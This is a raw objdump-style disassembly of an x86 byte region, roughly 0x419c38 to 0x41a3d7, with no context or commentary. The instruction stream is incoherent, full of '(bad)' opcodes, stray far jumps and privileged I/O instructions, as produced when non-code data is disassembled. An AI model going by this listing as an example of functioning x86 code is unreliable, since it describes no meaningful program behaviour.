  419c38:	imul   edx,DWORD PTR [edi+0x39],0x58752dd4
  419c3f:	mov    al,0x51
  419c41:	fadd   st(4),st
  419c43:	xchg   ebp,eax
  419c44:	imul   ebx,DWORD PTR [ebp+0x37],0x38ff97af
  419c4b:	stc    
  419c4c:	(bad)  
  419c4d:	cli    
  419c4e:	xor    edi,0x662094c5
  419c54:	out    0x48,al
  419c56:	data16 (bad) 
  419c58:	jmp    0x419c23
  419c5a:	mov    ebx,0xcafecd39
  419c5f:	imul   eax,edi,0x9611f92
  419c65:	mov    edx,0xe14800c4
  419c6a:	scas   eax,DWORD PTR es:[edi]
  419c6b:	sub    dl,BYTE PTR [ebp-0x7d3a989d]
  419c71:	mov    bh,0xec
  419c73:	pop    ebx
  419c74:	adc    ch,0x7e
  419c77:	sti    
  419c78:	dec    eax
  419c79:	cmc    
  419c7a:	ror    esp,cl
  419c7c:	jl     0x419c90
  419c7e:	enter  0x62bf,0x25
  419c82:	jmp    0x735649fc
  419c87:	mov    bl,BYTE PTR [esi-0x2e7dd7f]
  419c8d:	push   eax
  419c8e:	mov    ecx,0x6b7b3ad9
  419c93:	dec    ebx
  419c94:	dec    edi
  419c95:	out    dx,al
  419c96:	adc    BYTE PTR [eax+0x31cfb0db],0xbd
  419c9d:	jno    0x419d03
  419c9f:	clc    
  419ca0:	mov    ah,0x39
  419ca2:	das    
  419ca3:	mov    dl,0xd8
  419ca5:	mov    ds:0xaa7618be,eax
  419caa:	or     DWORD PTR [esi],0xffffffd4
  419cad:	pop    esp
  419cae:	retf   0x5099
  419cb1:	mov    edx,0x5b80c334
  419cb6:	xchg   DWORD PTR [edi+0x70],esi
  419cb9:	jbe    0x419d11
  419cbb:	cld    
  419cbc:	pop    esi
  419cbd:	jg     0x419c4b
  419cbf:	push   ebp
  419cc0:	cli    
  419cc1:	cdq    
  419cc2:	aad    0x9f
  419cc4:	or     cl,BYTE PTR [ecx+0x26]
  419cc7:	or     bl,BYTE PTR [ebp+0x78afd36e]
  419ccd:	inc    ebp
  419cce:	sti    
  419ccf:	push   ss
  419cd0:	sbb    eax,0x5a19aadb
  419cd5:	jb     0x419cbb
  419cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd8:	jp     0x419d39
  419cda:	dec    edx
  419cdc:	out    dx,al
  419cdd:	mov    bl,0x70
  419cdf:	pop    es
  419ce0:	outs   dx,BYTE PTR ds:[esi]
  419ce1:	sub    BYTE PTR [ebx-0x7e14a8d1],dl
  419ce7:	inc    esi
  419ce8:	loopne 0x419c85
  419cea:	es lock mov al,0x43
  419cee:	inc    ecx
  419cef:	inc    eax
  419cf0:	inc    ebx
  419cf1:	addr16 xor al,0x22
  419cf4:	sahf   
  419cf5:	jnp    0x419ccf
  419cf7:	xlat   BYTE PTR ds:[ebx]
  419cf8:	mov    esp,0x9b8a0d8c
  419cfd:	lods   al,BYTE PTR ds:[esi]
  419cfe:	or     al,0x52
  419d00:	pop    edi
  419d01:	or     eax,esi
  419d03:	inc    ecx
  419d04:	inc    edi
  419d05:	int3   
  419d06:	or     al,0x11
  419d08:	and    bl,BYTE PTR [edi+0x6ef5df91]
  419d0e:	stos   DWORD PTR es:[edi],eax
  419d0f:	aam    0xc9
  419d11:	pushf  
  419d12:	mov    eax,0x91b0b8d3
  419d17:	xchg   BYTE PTR [edx],dl
  419d19:	jnp    0x419d71
  419d1b:	mov    fs,WORD PTR [esi-0x17]
  419d1e:	in     al,0x71
  419d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d21:	sbb    BYTE PTR [edi+0x7a7e44ac],0xc7
  419d28:	fistp  WORD PTR [ebx]
  419d2a:	xor    BYTE PTR [esi],0x78
  419d2d:	mov    edi,DWORD PTR ds:0x2e41de24
  419d33:	mov    bh,0xc6
  419d35:	mov    ah,0x7d
  419d37:	or     eax,0x871e3612
  419d3c:	repnz mov bl,dh
  419d3f:	push   cs
  419d40:	add    ebx,DWORD PTR [ecx+0x4e07a1d]
  419d46:	ins    DWORD PTR es:[edi],dx
  419d47:	div    DWORD PTR [ebp+ebp*8+0x6e]
  419d4b:	sbb    al,BYTE PTR [ecx+ebp*8]
  419d4e:	into   
  419d4f:	xchg   edi,eax
  419d50:	mov    bl,0x97
  419d52:	mov    fs,WORD PTR [edi+0x63]
  419d55:	les    ebx,FWORD PTR [edi+0x49]
  419d58:	leave  
  419d59:	sub    BYTE PTR [esi+ebp*4+0x615d0c8a],0x87
  419d61:	fdivr  st,st(4)
  419d63:	dec    esp
  419d64:	adc    BYTE PTR [eax],bh
  419d66:	ror    ch,1
  419d68:	mov    al,0x0
  419d6a:	test   ebp,0xf898963c
  419d70:	aaa    
  419d71:	(bad)  
  419d72:	jl     0x419da9
  419d74:	popa   
  419d75:	pop    ecx
  419d76:	scas   eax,DWORD PTR es:[edi]
  419d77:	fld    QWORD PTR [ecx]
  419d79:	adc    esp,DWORD PTR [edi-0x6b]
  419d7c:	icebp  
  419d7d:	in     eax,0x6b
  419d7f:	sbb    BYTE PTR [ebx-0x5f],al
  419d82:	xor    ecx,edi
  419d84:	hlt    
  419d85:	stc    
  419d86:	push   esp
  419d87:	retf   
  419d88:	sub    ecx,esp
  419d8a:	ss dec esp
  419d8c:	cmp    al,0x33
  419d8e:	mov    edx,DWORD PTR [ebp-0x11]
  419d91:	mov    al,ds:0xf38b756c
  419d96:	xor    ah,BYTE PTR [eax]
  419d98:	jmp    0x3192:0x973501be
  419d9f:	int3   
  419da0:	retf   
  419da1:	adc    al,0x7c
  419da3:	mov    al,0x90
  419da5:	ret    
  419da6:	mov    cl,0x8f
  419da8:	(bad)  
  419daa:	(bad)  
  419dab:	hlt    
  419dac:	call   0xabde2b8c
  419db1:	div    DWORD PTR [ecx+edi*1+0x1f20c593]
  419db8:	cmp    BYTE PTR [edi],bl
  419dba:	lods   al,BYTE PTR ds:[esi]
  419dbb:	sub    ch,BYTE PTR [edx-0x10]
  419dbe:	cld    
  419dbf:	cmp    al,0xed
  419dc1:	cdq    
  419dc2:	push   eax
  419dc3:	inc    ebx
  419dc4:	repnz sub esp,DWORD PTR [ebx+0x37]
  419dc8:	bound  esp,QWORD PTR [ebx]
  419dca:	cmc    
  419dcb:	push   eax
  419dcc:	xchg   DWORD PTR [edx-0x24],edi
  419dcf:	call   0x2e3:0xf855a64e
  419dd6:	ins    BYTE PTR es:[edi],dx
  419dd7:	hlt    
  419dd8:	sbb    al,0x4e
  419dda:	not    DWORD PTR [edx+0x6a]
  419ddd:	xchg   edx,eax
  419dde:	jg     0x419e1d
  419de0:	retf   0x4caa
  419de3:	sar    DWORD PTR [edi],1
  419de5:	xor    eax,0x1e8fcc34
  419dea:	add    ebx,ebx
  419dec:	mov    cl,0xa4
  419dee:	repz sub al,0x7a
  419df1:	jmp    0x419ddf
  419df3:	sub    al,0x63
  419df5:	retf   
  419df6:	scas   eax,DWORD PTR es:[edi]
  419df7:	arpl   WORD PTR [esi],si
  419df9:	xlat   BYTE PTR ds:[ebx]
  419dfa:	jne    0x419dee
  419dfc:	les    ebp,FWORD PTR [ecx-0x3e]
  419dff:	push   0x752b19b1
  419e04:	hlt    
  419e05:	and    BYTE PTR [edx+0x67beb81c],dl
  419e0b:	jl     0x419e7a
  419e0d:	nop
  419e0e:	out    dx,al
  419e0f:	mov    ds:0x88f79963,eax
  419e14:	and    edx,DWORD PTR [edi-0xc127849]
  419e1a:	cmp    DWORD PTR [eax],0xffffffbe
  419e1d:	repnz dec ecx
  419e1f:	aam    0xb
  419e21:	int    0x21
  419e23:	mov    dl,0x1c
  419e25:	or     DWORD PTR [edi+0x15],ebx
  419e28:	jb     0x419dbd
  419e2a:	and    cl,dl
  419e2c:	(bad)  
  419e2d:	mov    esp,0x51e6fd0a
  419e32:	push   edx
  419e33:	pop    esi
  419e34:	push   esp
  419e35:	xor    BYTE PTR [ebx+ebx*1+0x1c],ch
  419e39:	ins    BYTE PTR es:[edi],dx
  419e3a:	stc    
  419e3b:	sahf   
  419e3c:	ret    
  419e3d:	and    al,BYTE PTR [edi-0x48]
  419e40:	xor    al,0xa3
  419e42:	ja     0x419e31
  419e44:	(bad)  
  419e45:	div    BYTE PTR [ecx+0x42]
  419e48:	daa    
  419e49:	cdq    
  419e4a:	sub    ebp,DWORD PTR [esi+0x5c45a491]
  419e50:	dec    esi
  419e51:	fisubr WORD PTR [esi]
  419e53:	fwait
  419e54:	mov    dh,0x54
  419e56:	addr16 dec bp
  419e59:	pop    es
  419e5a:	dec    ebp
  419e5b:	mov    ebx,0x7540cea2
  419e60:	sub    cl,dl
  419e62:	push   edi
  419e63:	popf   
  419e64:	repz sub ch,0x4e
  419e68:	les    eax,FWORD PTR [eax-0x2c]
  419e6b:	shl    DWORD PTR [ecx-0x42d68de4],cl
  419e71:	push   esi
  419e72:	mov    al,ds:0xf8cd39b4
  419e77:	ss dec ebx
  419e79:	(bad)  
  419e7a:	jl     0x419e6c
  419e7c:	mov    dl,0x67
  419e7e:	push   es
  419e7f:	and    DWORD PTR [ebp-0x74],ebx
  419e82:	nop
  419e83:	adc    ebx,DWORD PTR [ebx+0x647b41f4]
  419e89:	fnstsw WORD PTR [eax]
  419e8b:	js     0x419e15
  419e8d:	jge    0x419e46
  419e8f:	lahf   
  419e90:	bound  esp,QWORD PTR [eax-0x78d6c9cb]
  419e96:	pop    ds
  419e97:	mov    WORD PTR [esi],cs
  419e99:	frstor [esi-0x77a4bc48]
  419e9f:	adc    esp,DWORD PTR [ebx+esi*8-0x339930e7]
  419ea6:	ja     0x419e7a
  419ea8:	mov    dh,0x2
  419eaa:	mov    esp,ss
  419eac:	(bad)  
  419ead:	mov    edi,0x37c2ed01
  419eb2:	imul   edi,DWORD PTR [ecx],0x75ae141c
  419eb8:	sahf   
  419eb9:	out    dx,eax
  419eba:	or     eax,0x63b2309b
  419ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ec0:	inc    ebx
  419ec1:	scas   al,BYTE PTR es:[edi]
  419ec2:	push   es
  419ec3:	popf   
  419ec4:	leave  
  419ec5:	jno    0x419eae
  419ec7:	sti    
  419ec8:	push   ss
  419ec9:	mov    ds,WORD PTR [esi-0x33c7e4cf]
  419ecf:	mov    edx,0xd2d66e7e
  419ed4:	mov    eax,0x29fca93d
  419ed9:	cld    
  419eda:	mov    ecx,0x6df48b91
  419edf:	pop    es
  419ee0:	dec    edx
  419ee1:	mov    edi,0xda1d6b99
  419ee6:	pop    esi
  419ee7:	sbb    DWORD PTR [edi-0x4e1b8f3f],0xa5b9c353
  419ef1:	sbb    al,0xc1
  419ef3:	mov    cl,0x97
  419ef5:	pop    ebp
  419ef6:	and    al,0x4d
  419ef8:	mov    ds:0xbb58d5db,eax
  419efd:	xchg   esp,eax
  419efe:	xor    DWORD PTR [edx],0xffffff93
  419f01:	and    BYTE PTR [ebx+0x5b66df30],dh
  419f07:	jmp    0x419e9e
  419f09:	pop    ss
  419f0a:	mov    ebp,edi
  419f0c:	fidivr DWORD PTR [edx+0x7576e35e]
  419f12:	and    al,0x90
  419f14:	mov    fs,WORD PTR [ecx]
  419f16:	xchg   ebx,eax
  419f17:	loope  0x419ef0
  419f19:	jg     0x419f3c
  419f1b:	jg     0x419f10
  419f1d:	jg     0x419ee6
  419f1f:	sub    eax,0xd5b663a4
  419f24:	pop    edi
  419f25:	loopne 0x419f7b
  419f27:	inc    esi
  419f28:	(bad)  
  419f29:	call   0x9b72f30b
  419f2e:	add    DWORD PTR [eax],edi
  419f30:	push   cs
  419f31:	xchg   esp,eax
  419f32:	xchg   esi,eax
  419f33:	shl    BYTE PTR [eax+0x4f8b4c19],1
  419f39:	pop    ds
  419f3a:	jp     0x419ebf
  419f3c:	shr    eax,0x8
  419f3f:	mov    dh,0x59
  419f41:	fld    QWORD PTR [ecx-0x350b91f5]
  419f47:	jge    0x419f12
  419f49:	adc    ebx,esi
  419f4b:	inc    edx
  419f4c:	(bad)  
  419f4d:	sub    al,0xec
  419f4f:	cdq    
  419f50:	cmp    al,0x0
  419f52:	js     0x419f03
  419f54:	fisttp QWORD PTR [ebx+edx*4+0x7917874b]
  419f5b:	rcl    BYTE PTR [ebx+eax*8-0x2ab35e32],0x4e
  419f63:	iret   
  419f64:	add    dh,ch
  419f66:	ins    DWORD PTR es:[edi],dx
  419f67:	fs in  eax,dx
  419f69:	dec    esp
  419f6a:	scas   eax,DWORD PTR es:[edi]
  419f6b:	shr    esp,cl
  419f6d:	jmp    0x419fba
  419f6f:	inc    ecx
  419f70:	repz adc ax,0x29ca
  419f75:	jae    0x419fc1
  419f77:	jns    0x419fe5
  419f79:	enter  0x2b38,0x90
  419f7d:	mov    al,ds:0x1a5b6d2d
  419f82:	and    ebx,DWORD PTR [eax-0x2]
  419f85:	sahf   
  419f86:	imul   ebx,DWORD PTR [ecx],0xa07b3a4f
  419f8c:	mov    ds:0x203cb9,eax
  419f91:	inc    edx
  419f92:	xchg   edi,eax
  419f93:	or     eax,0x8372eea9
  419f98:	jmp    0x419f99
  419f9a:	in     al,0x1d
  419f9c:	push   ecx
  419f9d:	les    esp,FWORD PTR [edx-0x5f03b230]
  419fa3:	pop    ss
  419fa4:	lds    esp,FWORD PTR [eax]
  419fa6:	add    bl,BYTE PTR [ecx+ebx*2]
  419fa9:	in     eax,dx
  419faa:	js     0x41a010
  419fac:	cmp    DWORD PTR [eax+ecx*2],esp
  419faf:	bound  edi,QWORD PTR [edx]
  419fb1:	push   esp
  419fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fb3:	add    BYTE PTR [esi-0x76],cl
  419fb6:	mov    al,0xc8
  419fb8:	mov    eax,ds:0xf1568097
  419fbd:	adc    edi,DWORD PTR [edi+edx*2+0x77]
  419fc1:	push   esi
  419fc2:	nop
  419fc3:	xchg   DWORD PTR [edx],eax
  419fc5:	test   cl,dl
  419fc7:	std    
  419fc8:	int    0xfc
  419fca:	push   0x31
  419fcc:	sbb    ebp,DWORD PTR [edx]
  419fce:	retf   0xfbec
  419fd1:	add    DWORD PTR [edi],eax
  419fd3:	repz (bad) 
  419fd5:	sub    edx,eax
  419fd7:	xor    ch,BYTE PTR [eax]
  419fd9:	daa    
  419fda:	gs jo  0x419f93
  419fdd:	add    cl,ch
  419fdf:	ror    al,0xf9
  419fe2:	lods   al,BYTE PTR ds:[esi]
  419fe3:	mov    al,0xd5
  419fe5:	or     cl,bh
  419fe7:	scas   al,BYTE PTR es:[edi]
  419fe8:	push   ss
  419fe9:	adc    eax,0xfee9d16c
  419fee:	mov    dl,BYTE PTR [edi+edi*1+0x15]
  419ff2:	sbb    eax,0x2c3e53b0
  419ff7:	add    bl,0x46
  419ffa:	aaa    
  419ffb:	adc    ebp,DWORD PTR [edi+eax*8+0x282abe5c]
  41a002:	iret   
  41a003:	pop    DWORD PTR [esi-0x2c64fa1b]
  41a009:	cmc    
  41a00a:	pmaxsw mm0,QWORD PTR fs:[ebp-0x508f9b30]
  41a012:	and    bl,ch
  41a014:	cwde   
  41a015:	sub    edx,DWORD PTR [edx-0x46]
  41a018:	sbb    bh,BYTE PTR [ebp+ecx*2-0x54cfc9e4]
  41a01f:	dec    ecx
  41a020:	pop    edx
  41a021:	jae    0x41a04a
  41a023:	xor    dl,BYTE PTR [ecx-0xd]
  41a026:	mov    bl,0xb9
  41a028:	jae    0x419fb2
  41a02a:	hlt    
  41a02b:	inc    esi
  41a02c:	retf   0xe49a
  41a02f:	test   al,0xe1
  41a031:	out    0x94,al
  41a033:	push   ebx
  41a034:	adc    ch,BYTE PTR [ebx-0x7daba8a2]
  41a03a:	in     al,0x6c
  41a03c:	lea    ecx,[esi+eax*8]
  41a03f:	test   al,0x8e
  41a041:	mov    ch,0x38
  41a043:	mov    ds:0xb5ed3ae6,eax
  41a048:	call   ebx
  41a04a:	add    al,0x5a
  41a04c:	sbb    al,0x11
  41a04e:	mov    ebp,0x3221663f
  41a053:	xchg   ebp,eax
  41a054:	ins    DWORD PTR es:[edi],dx
  41a055:	or     al,0x51
  41a057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a058:	daa    
  41a059:	icebp  
  41a05a:	(bad)  
  41a05b:	imul   eax,DWORD PTR [edi+0x24],0xbb9214a8
  41a062:	call   0x6674:0xcdb6ef2c
  41a069:	adc    eax,0x3889e40b
  41a06e:	(bad)  
  41a06f:	xchg   ecx,eax
  41a070:	ficomp DWORD PTR [eax-0x5e04d577]
  41a076:	xchg   edx,eax
  41a077:	ss popa 
  41a079:	sbb    DWORD PTR [edx-0x6143077a],0x84ac0171
  41a083:	jge    0x41a04b
  41a085:	not    DWORD PTR [ebp+0x13c9dd75]
  41a08b:	movntq QWORD PTR [esi+0x24],mm6
  41a08f:	loopne 0x41a092
  41a091:	int3   
  41a092:	xchg   edx,eax
  41a093:	push   0x5
  41a095:	into   
  41a096:	and    eax,0x841c97b4
  41a09b:	out    0xa9,al
  41a09d:	int3   
  41a09e:	mov    al,ds:0x6293ed0b
  41a0a3:	test   BYTE PTR [ecx+0x1ef0a3f],ah
  41a0a9:	sub    BYTE PTR [edx],cl
  41a0ab:	sub    esi,eax
  41a0ad:	sbb    eax,0xd525453a
  41a0b2:	mov    bl,0x86
  41a0b4:	call   0x18a8:0xa46d330d
  41a0bb:	arpl   dx,di
  41a0bd:	mov    ebp,0xcfe0c60e
  41a0c2:	push   esi
  41a0c3:	sti    
  41a0c4:	(bad)
  41a0c7:	je     0x41a08e
  41a0c9:	repz and ecx,DWORD PTR [ecx]
  41a0cc:	ds loop 0x41a096
  41a0cf:	add    bh,BYTE PTR [eax]
  41a0d1:	xor    DWORD PTR [eax+esi*8-0x24],esp
  41a0d5:	mov    al,ds:0x25f3c88f
  41a0da:	sbb    eax,DWORD PTR [ebx-0x243ca21b]
  41a0e0:	ins    BYTE PTR es:[edi],dx
  41a0e1:	hlt    
  41a0e2:	push   ebp
  41a0e3:	cwde   
  41a0e4:	lods   eax,DWORD PTR ds:[esi]
  41a0e5:	sub    eax,0x7f973e69
  41a0ea:	fldcw  WORD PTR [edx+0x67]
  41a0ed:	sub    ebx,DWORD PTR [edi-0x74]
  41a0f0:	adc    al,ch
  41a0f2:	push   es
  41a0f3:	jbe    0x41a0ec
  41a0f5:	repz mov edx,0x7564920f
  41a0fb:	dec    esp
  41a0fc:	cwde   
  41a0fd:	jo     0x41a153
  41a0ff:	jno    0x41a099
  41a101:	mov    ds:0xea85897c,al
  41a106:	es data16 lock mov ah,0xaf
  41a10b:	shrd   DWORD PTR [esi+0x2597a3a],esi,0x27
  41a113:	aam    0xb3
  41a115:	in     al,0x80
  41a117:	xchg   ebx,eax
  41a118:	dec    esi
  41a119:	imul   edi,DWORD PTR [eax-0x355c4a02],0x5
  41a120:	ins    BYTE PTR es:[edi],dx
  41a121:	rcl    BYTE PTR [ebx+0x48],cl
  41a124:	adc    al,0xfc
  41a126:	out    dx,al
  41a127:	xchg   ebx,eax
  41a128:	cmp    ah,BYTE PTR [bx+0x392d]
  41a12d:	scas   al,BYTE PTR es:[edi]
  41a12e:	push   ecx
  41a12f:	pop    ss
  41a130:	call   0x45709ecf
  41a135:	add    DWORD PTR [eax+0x30],eax
  41a138:	dec    edi
  41a139:	mov    ebp,0xc40e6cc8
  41a13e:	(bad)  
  41a13f:	ins    DWORD PTR es:[edi],dx
  41a140:	ins    BYTE PTR es:[edi],dx
  41a141:	scas   eax,DWORD PTR es:[edi]
  41a142:	popf   
  41a143:	jne    0x41a115
  41a145:	mov    dh,0xa
  41a147:	lock and cl,BYTE PTR [eax]
  41a14a:	addr16 jnp 0x41a1c5
  41a14d:	cmp    al,0x48
  41a14f:	cmp    DWORD PTR [edi-0x4c180723],eax
  41a155:	outs   dx,BYTE PTR ds:[esi]
  41a156:	or     eax,0x3ab4a319
  41a15b:	stos   DWORD PTR es:[edi],eax
  41a15c:	or     BYTE PTR [ebx-0x5133a735],ch
  41a162:	mov    al,ds:0x4b63e79a
  41a167:	adc    al,0x20
  41a169:	fstp   TBYTE PTR [ebp+0x58f196f7]
  41a16f:	sub    DWORD PTR [ecx-0x1924fdc9],0xf222710a
  41a179:	aas    
  41a17a:	popf   
  41a17b:	add    al,0xb3
  41a17d:	hlt    
  41a17e:	mov    bl,0x72
  41a180:	ficomp WORD PTR [ecx]
  41a182:	popf   
  41a183:	mov    ebx,0xc4bb63dd
  41a188:	das    
  41a189:	loopne 0x41a110
  41a18b:	cld    
  41a18c:	scas   eax,DWORD PTR es:[edi]
  41a18d:	jge    0x41a165
  41a18f:	dec    ebp
  41a190:	(bad)  
  41a191:	mov    dl,0xb8
  41a193:	lods   eax,DWORD PTR ds:[esi]
  41a194:	xchg   esp,eax
  41a195:	loop   0x41a1da
  41a197:	imul   ecx,DWORD PTR [esi-0x6b],0x9d6285e9
  41a19e:	jb     0x41a14a
  41a1a0:	or     BYTE PTR [ecx-0x36],ah
  41a1a3:	jle    0x41a167
  41a1a5:	cmc    
  41a1a6:	mov    ?,WORD PTR [ebx]
  41a1a8:	out    0xe3,al
  41a1aa:	inc    ecx
  41a1ab:	rol    BYTE PTR [edi],1
  41a1ad:	call   0xe7456cbb
  41a1b2:	psubb  mm2,QWORD PTR ds:0x8a5314b3
  41a1b9:	lods   al,BYTE PTR ds:[esi]
  41a1ba:	fxch   st(4)
  41a1bc:	cdq    
  41a1bd:	and    BYTE PTR [esi-0x36],0xa9
  41a1c1:	push   ebx
  41a1c2:	ds jnp 0x41a1c9
  41a1c5:	loopne 0x41a20f
  41a1c7:	scas   eax,DWORD PTR es:[edi]
  41a1c8:	mov    ah,bh
  41a1ca:	repz call 0xedd51b12
  41a1d0:	js     0x41a236
  41a1d2:	retf   
  41a1d3:	mov    eax,DWORD PTR [edx]
  41a1d5:	add    al,0xf4
  41a1d7:	add    eax,0x7ee48982
  41a1dc:	mov    ch,0x33
  41a1de:	sbb    al,0x80
  41a1e0:	sbb    eax,0xe4bdb18b
  41a1e5:	fdiv   st,st(3)
  41a1e7:	xor    BYTE PTR [ebx+0x372879ce],bh
  41a1ed:	xor    bl,BYTE PTR [ebx-0x19e15377]
  41a1f3:	aas    
  41a1f4:	int3   
  41a1f5:	sbb    BYTE PTR [ecx],dl
  41a1f7:	hlt    
  41a1f8:	cmp    ebx,DWORD PTR [ecx-0x34d45616]
  41a1fe:	ds cmp al,0x79
  41a201:	ficomp DWORD PTR [ebp-0x95d3713]
  41a207:	jmp    0xbc15:0x6b80fca9
  41a20e:	mov    dh,0x4a
  41a210:	mov    bl,0xeb
  41a212:	enter  0xf180,0x7e
  41a216:	jecxz  0x41a1a8
  41a218:	nop
  41a219:	prefetcht1 BYTE PTR [edx+0x68]
  41a21d:	and    al,0x64
  41a21f:	cmp    BYTE PTR [edi],dh
  41a221:	popa   
  41a222:	fdiv   DWORD PTR [edi-0x6ed1604b]
  41a228:	and    DWORD PTR [eax-0x1b],edi
  41a22b:	sbb    al,BYTE PTR [edx]
  41a22d:	xlat   BYTE PTR ds:[ebx]
  41a22e:	in     al,0xe4
  41a230:	daa    
  41a231:	fdivr  QWORD PTR ds:[edi]
  41a234:	aam    0x98
  41a236:	loope  0x41a25b
  41a238:	xchg   ecx,eax
  41a239:	cmc    
  41a23a:	push   ebp
  41a23b:	xor    DWORD PTR ds:0x64189dd9,0xffffffe6
  41a242:	mov    al,ds:0x432b3ccd
  41a247:	jnp    0x41a1f9
  41a249:	sub    cl,BYTE PTR [eax+0xa]
  41a24c:	mul    BYTE PTR [edi+ecx*2]
  41a24f:	jge    0x41a23e
  41a251:	popa   
  41a252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a253:	imul   DWORD PTR [edi]
  41a255:	sbb    bh,BYTE PTR [esi]
  41a257:	outs   dx,DWORD PTR ds:[esi]
  41a258:	push   0xffffffc1
  41a25a:	iret   
  41a25b:	cli    
  41a25c:	sub    al,0x32
  41a25e:	inc    esi
  41a25f:	das    
  41a260:	mov    esi,0x33826064
  41a265:	mov    cl,0xe7
  41a267:	push   edx
  41a268:	ds mov dh,0x7b
  41a26b:	pop    ds
  41a26c:	or     DWORD PTR gs:[ebx],edi
  41a26f:	jle    0x41a2e6
  41a271:	in     eax,0xf9
  41a273:	push   es
  41a274:	mov    ds:0x7b5e7f68,eax
  41a279:	ds inc eax
  41a27b:	sbb    esi,DWORD PTR [edx-0x6b9ddc35]
  41a281:	fimul  DWORD PTR [ecx+0x9]
  41a284:	push   0xbdc5071c
  41a289:	sub    BYTE PTR [ebp+0x7e468ee4],0xa6
  41a290:	pop    edi
  41a291:	sub    al,BYTE PTR [edi]
  41a293:	out    dx,eax
  41a294:	ret    0x77ff
  41a297:	sub    eax,0x4f6d26e8
  41a29c:	imul   esi,DWORD PTR [edi+0x4b],0xffffff90
  41a2a0:	push   ebx
  41a2a1:	jecxz  0x41a2d9
  41a2a3:	cs mov al,0x1
  41a2a6:	mov    gs,esp
  41a2a8:	sbb    dh,BYTE PTR ds:0xb29c04b4
  41a2ae:	mov    bl,0x8f
  41a2b0:	jg     0x41a327
  41a2b2:	xchg   ebp,eax
  41a2b3:	ds inc edx
  41a2b5:	cmp    bh,ch
  41a2b7:	sbb    ah,bl
  41a2b9:	nop
  41a2ba:	mov    ecx,?
  41a2bc:	fs xchg esp,eax
  41a2bf:	pop    ss
  41a2c0:	jg     0x41a287
  41a2c2:	sub    al,0xd1
  41a2c4:	mov    DWORD PTR [ebp+0x7d6eefe6],ebx
  41a2ca:	fcmovb st,st(0)
  41a2cc:	adc    DWORD PTR [edi-0x7d3b6b6d],ebx
  41a2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2d3:	stos   DWORD PTR es:[edi],eax
  41a2d4:	jne    0x41a290
  41a2d6:	mov    esp,0x36815169
  41a2db:	in     al,0x90
  41a2dd:	pop    eax
  41a2de:	sub    edi,DWORD PTR [edx]
  41a2e0:	or     al,BYTE PTR [ebx+0x15]
  41a2e3:	mov    ebx,0x53397f86
  41a2e8:	or     ebx,DWORD PTR [ecx]
  41a2ea:	(bad)  
  41a2eb:	shl    BYTE PTR [ebx+0x70572b47],1
  41a2f1:	inc    esp
  41a2f2:	retf   
  41a2f3:	adc    DWORD PTR [ecx+0xf],edi
  41a2f6:	and    al,0xfb
  41a2f8:	adc    al,0xda
  41a2fa:	mov    al,ds:0x22b2245
  41a2ff:	jecxz  0x41a361
  41a301:	xchg   edx,eax
  41a302:	ins    DWORD PTR es:[edi],dx
  41a303:	mov    eax,ds:0xc2eb0c9d
  41a308:	arpl   WORD PTR [eax],si
  41a30a:	inc    esi
  41a30b:	cmp    cl,al
  41a30d:	es inc ebx
  41a30f:	ror    ah,1
  41a311:	jae    0x41a377
  41a313:	imul   ecx,ebp,0xffffffec
  41a316:	loopne 0x41a324
  41a318:	jb     0x41a34c
  41a31a:	prefetchwt1 BYTE PTR [ecx]
  41a31d:	sub    cl,BYTE PTR [eax+0xa]
  41a320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a321:	fs popa 
  41a323:	jecxz  0x41a394
  41a325:	pop    ds
  41a326:	test   eax,0x53f0d6f1
  41a32b:	in     eax,0x90
  41a32d:	jae    0x41a2e1
  41a32f:	out    dx,al
  41a330:	in     eax,dx
  41a331:	call   0x7bda:0x874a44e4
  41a338:	xchg   BYTE PTR [eax+0x24a19207],bh
  41a33e:	push   ecx
  41a33f:	push   edi
  41a340:	retf   0xf7ab
  41a343:	ret    
  41a344:	lods   eax,DWORD PTR ds:[esi]
  41a345:	inc    esp
  41a346:	pop    es
  41a347:	jle    0x41a33f
  41a349:	fucomip st,st(6)
  41a34b:	mov    ah,BYTE PTR [edx-0x5b]
  41a34e:	inc    ecx
  41a34f:	or     ah,0x67
  41a352:	or     al,ah
  41a354:	and    dh,BYTE PTR ds:0x1272b5e2
  41a35a:	mov    esi,0x9a3dbf8f
  41a35f:	push   esp
  41a360:	and    BYTE PTR [esi+0x1a],0x7d
  41a364:	sub    bl,BYTE PTR [ebp*1+0x594fe365]
  41a36b:	dec    ebp
  41a36c:	xchg   edx,eax
  41a36d:	aas    
  41a36e:	call   0xb1d5:0x894a1c09
  41a375:	and    eax,0x43eb5598
  41a37a:	(bad)  
  41a37b:	sub    eax,eax
  41a37d:	xchg   edx,eax
  41a37e:	mov    cl,0xcd
  41a380:	or     edi,ebp
  41a382:	mov    ah,0x58
  41a384:	inc    ebp
  41a385:	aam    0x74
  41a387:	push   edx
  41a388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a389:	push   esp
  41a38a:	sbb    DWORD PTR [esi+0x26],esp
  41a38d:	icebp  
  41a38e:	and    al,0x56
  41a390:	xchg   BYTE PTR [esi+0x73],ah
  41a393:	pusha  
  41a394:	push   ss
  41a395:	loopne 0x41a326
  41a397:	dec    ecx
  41a398:	adc    eax,0x587ac4fb
  41a39d:	aad    0x66
  41a39f:	lods   al,BYTE PTR ds:[esi]
  41a3a0:	dec    ebp
  41a3a1:	fwait
  41a3a2:	mov    ecx,0xaa1f8d9e
  41a3a7:	pop    ebx
  41a3a8:	call   0x79225ebe
  41a3ad:	aad    0x5e
  41a3af:	rol    ebp,1
  41a3b1:	or     eax,0x92ba03ef
  41a3b6:	inc    edx
  41a3b7:	lds    edi,FWORD PTR [edi+ecx*4+0x43fd7324]
  41a3be:	in     eax,0x70
  41a3c0:	cld    
  41a3c1:	mov    DWORD PTR [eax+0x2f06c677],esi
  41a3c7:	push   eax
  41a3c8:	mov    bh,0x49
  41a3ca:	sub    edi,DWORD PTR [ecx+0x3a0e1b44]
  41a3d0:	adc    eax,0xce165e55
  41a3d5:	pop    ss
  41a3d6:	ins    DWORD PTR es:[edi],dx
  41a3d7:	mov    ah,0x9b
